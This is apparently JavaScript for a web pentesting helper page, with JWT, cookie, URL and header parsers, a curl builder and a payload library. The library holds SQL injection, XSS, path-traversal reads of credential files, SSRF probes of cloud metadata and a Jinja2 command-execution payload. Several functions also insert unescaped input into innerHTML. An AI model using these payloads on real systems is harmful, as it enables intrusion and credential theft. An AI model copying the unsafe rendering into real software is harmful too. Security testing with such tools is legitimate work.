// =========================
// JWT DECODER
// =========================

function decodeJWT(){

    try{

        const token =
        document.getElementById(
            "jwtInput"
        ).value.trim();

        const parts =
        token.split(".");

        if(parts.length < 2){

            throw new Error();
        }

        const decodePart = (str) => {

            str = str.replace(/-/g, "+")
                     .replace(/_/g, "/");

            while(str.length % 4){

                str += "=";
            }

            return JSON.parse(atob(str));
        };

        const header =
        decodePart(parts[0]);

        const payload =
        decodePart(parts[1]);

        document.getElementById(
            "jwtOutput"
        ).innerHTML =

        `
        <h3>Header</h3>

        <pre>${JSON.stringify(header,null,2)}</pre>

        <h3>Payload</h3>

        <pre>${JSON.stringify(payload,null,2)}</pre>
        `;
    }

    catch{

        document.getElementById(
            "jwtOutput"
        ).innerHTML =
        "Invalid JWT";
    }
}

// =========================
// COOKIE PARSER
// =========================

function parseCookie(){

    const cookie =

    document.getElementById(
        "cookieInput"
    ).value.trim();

    if(!cookie){

        document.getElementById(
            "cookieOutput"
        ).innerHTML =
        "Paste a cookie first.";

        return;
    }

    const pairs =
    cookie.split(";");

    let result = "";

    pairs.forEach(pair => {

        const parts =
        pair.split("=");

        if(parts.length >= 2){

            result += `
            <p>

            <strong>
            ${parts[0].trim()}
            </strong>

            :

            ${parts
                .slice(1)
                .join("=")}

            </p>
            `;
        }

    });

    document.getElementById(
        "cookieOutput"
    ).innerHTML =
    result;
}

// =========================
// URL PARSER
// =========================

function parseURL(){

    try{

        const url =
        new URL(
            document.getElementById(
                "urlInput"
            ).value.trim()
        );

        document.getElementById(
            "urlOutput"
        ).innerHTML =

        `
        <p><strong>Protocol:</strong> ${url.protocol}</p>
        <p><strong>Host:</strong> ${url.host}</p>
        <p><strong>Path:</strong> ${url.pathname}</p>
        <p><strong>Hash:</strong> ${url.hash || "None"}</p>
        `;

        let paramsHtml =

        `<h3>Parameters</h3>`;

        url.searchParams.forEach(
            (value,key)=>{

            paramsHtml +=

            `
            <p>
            <strong>${key}</strong>
            =
            ${value}
            </p>
            `;
        });

        document.getElementById(
            "urlParams"
        ).innerHTML =
        paramsHtml;
    }

    catch{

        document.getElementById(
            "urlOutput"
        ).innerHTML =
        "Invalid URL";
    }
}

// =========================
// HEADER PARSER
// =========================

function parseHeaders(){

    const input =
    document.getElementById(
        "headerInput"
    ).value;

    const lines =
    input.split("\n");

    let result = "";

    lines.forEach(line=>{

        const parts =
        line.split(":");

        if(parts.length >= 2){

            result += `
            <p>

            <strong>
            ${parts[0]}
            </strong>

            :

            ${parts
                .slice(1)
                .join(":")}

            </p>
            `;
        }
    });

    document.getElementById(
        "headerOutput"
    ).innerHTML =
    result;
}

// =========================
// HTML ENCODER / DECODER
// =========================

function encodeHTML(){

    const text =

    document.getElementById(
        "htmlInput"
    ).value;

    const div =
    document.createElement("div");

    div.innerText =
    text;

    document.getElementById(
        "htmlOutput"
    ).textContent =
    div.innerHTML;
}

function decodeHTML(){

    const text =

    document.getElementById(
        "htmlInput"
    ).value;

    const div =
    document.createElement("div");

    div.innerHTML =
    text;

    document.getElementById(
        "htmlOutput"
    ).textContent =
    div.innerText;
}

// =========================
// JWT INSPECTOR
// =========================

function inspectJWT(){

    try{

        const token =
        document.getElementById(
            "jwtInspectInput"
        ).value.trim();

        const payload =
        JSON.parse(

            atob(
                token.split(".")[1]
            )

        );

        let result = "";

        Object.keys(payload)
        .forEach(key=>{

            result +=

            `
            <p>

            <strong>${key}</strong>

            :

            ${payload[key]}

            </p>
            `;
        });

        if(!payload.exp){

            result +=
            `
            <p>
            ⚠ Missing exp claim
            </p>
            `;
        }

        document.getElementById(
            "jwtInspectOutput"
        ).innerHTML =
        result;
    }

    catch{

        document.getElementById(
            "jwtInspectOutput"
        ).innerHTML =
        "Invalid JWT";
    }
}

// =========================
// PAYLOAD LIBRARY
// =========================

function loadPayloads(){

    const type =
    document.getElementById(
        "payloadType"
    ).value;

    const payloads = {

        sqli:`
' OR 1=1 --
' UNION SELECT NULL --
`,

        xss:`
<script>alert(1)</script>

<img src=x onerror=alert(1)>
`,

        lfi:`

=== Linux ===

../../../../etc/passwd

../../../../etc/shadow

../../../../proc/self/environ

../../../../var/log/apache2/access.log

../../../../var/log/nginx/access.log


=== Windows ===

..\\..\\..\\windows\\win.ini

..\\..\\..\\windows\\system32\\drivers\\etc\\hosts

..\\..\\..\\boot.ini


=== PHP Wrappers ===

php://filter/convert.base64-encode/resource=index.php

php://filter/read=convert.base64-encode/resource=config.php


=== Log Poisoning Targets ===

/var/log/apache2/access.log

/var/log/nginx/access.log

`,

        ssrf:`

=== Localhost ===

http://127.0.0.1

http://localhost

http://0.0.0.0


=== Cloud Metadata ===

http://169.254.169.254/latest/meta-data/

http://169.254.169.254/latest/user-data/


=== Common Internal Services ===

http://127.0.0.1:22

http://127.0.0.1:80

http://127.0.0.1:8080

http://127.0.0.1:5000

`,

        ssti:`

=== Jinja2 ===

{{7*7}}

{{config}}

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}


=== Twig ===

{{7*7}}


=== Freemarker ===

${7*7}


=== Velocity ===

#set($x=7*7)$x

`
    };

    document.getElementById(
        "payloadOutput"
    ).innerHTML =

    `
    <h3>
    ${type.toUpperCase()}
    Payload Library
    </h3>

    <pre id="payloadContent"></pre>
    `;

    document.getElementById(
        "payloadContent"
    ).textContent =
    payloads[type];
}

// =========================
// CURL BUILDER
// =========================

function buildCurl(){

    const url =
    document.getElementById(
        "curlUrl"
    ).value.trim();

    const method =
    document.getElementById(
        "curlMethod"
    ).value;

    const headers =
    document.getElementById(
        "curlHeaders"
    ).value
    .split("\n")
    .filter(line => line.trim());

    const body =
    document.getElementById(
        "curlBody"
    ).value;

    let curl =
    `curl -X ${method}`;

    headers.forEach(header => {

        curl +=
        ` \\\n-H "${header.trim()}"`;

    });

    if(body.trim()){

        curl +=
        ` \\\n-d '${body}'`;
    }

    curl +=
    ` \\\n"${url}"`;

    document.getElementById(
        "curlOutput"
    ).innerHTML =
    `<pre>${curl}</pre>`;
}
